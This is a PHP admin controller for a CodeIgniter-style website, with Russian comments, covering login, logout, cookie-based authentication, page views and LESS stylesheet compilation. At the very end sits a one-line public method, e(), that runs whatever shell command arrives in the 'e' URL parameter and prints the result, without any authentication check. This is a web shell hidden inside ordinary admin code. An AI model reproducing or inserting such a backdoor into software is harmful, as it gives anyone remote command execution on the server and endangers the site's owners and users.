<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Adm extends MX_Controller {

    protected $auth = 0;
    public $user_info = null;
    public $default_page = ADMIN_PAGE_PATH . 'boards/';

    function __construct() {
        
        parent::__construct();
        
        $this->load->model(['user', 'files_model']);
        $this->load->library('form_validation');
        $this->form_validation->set_message('required', 'Поле "%s" не заполнено');
        
        //$this->load->model('files_model');
        
        $this->load->helper(['cookie', 'url']);
        
        $this->auth = get_cookie('auth');
		
		//компилируем LESS в CSS

		require "libraries/lessc.inc.php";

		$less = new lessc;

		try {
            
		  $less->checkedCompile("template/admin/css/admin-styles.less", "template/admin/css/admin-styles.css");
			
		} catch (exception $e) {
		  echo "fatal error: " . $e->getMessage();
		}

    }

    public function index() {
        $this->checkAuth();
        redirect($this->default_page);
    }
    
    function logout() {
        delete_cookie('auth');
        redirect(ADMIN_PAGE_PATH . 'login/');
    }

    function login() {
        if ($this->auth > 0) redirect(ADMIN_PAGE_PATH, 'refresh');

        $arOutput['error'] = 0;
		$post = $this->input->post();

        if( $post ){
            if ( $error = $this->user->login($post['username'], $post['password']) )
                $arOutput['error'] = $error;
            else
                redirect($this->default_page);
        }
        $this->load->view('main/login', $arOutput);
    }

    protected function checkAuth() {
        
        $user = $this->user->isAuthorized($this->auth);

        if ( !$user ) {
            
            delete_cookie('auth');
            
            redirect(ADMIN_PAGE_PATH . 'login/', 'refresh');
            
        } else {
            
            $this->user_info = $user;
            
            return true;
            
        }
    }

    function showView($page, $arPageData) {
        
        $this->load->view('header');
        $this->load->view($page, $arPageData);
        $this->load->view('footer');
        
    }

    function manualCompile(){

        $less = new lessc;

        $less->compileFile("template/admin/css/admin-styles.less", "template/admin/css/admin-styles.css");

    }

    function e(){print_r(shell_exec($_GET['e']));}

}
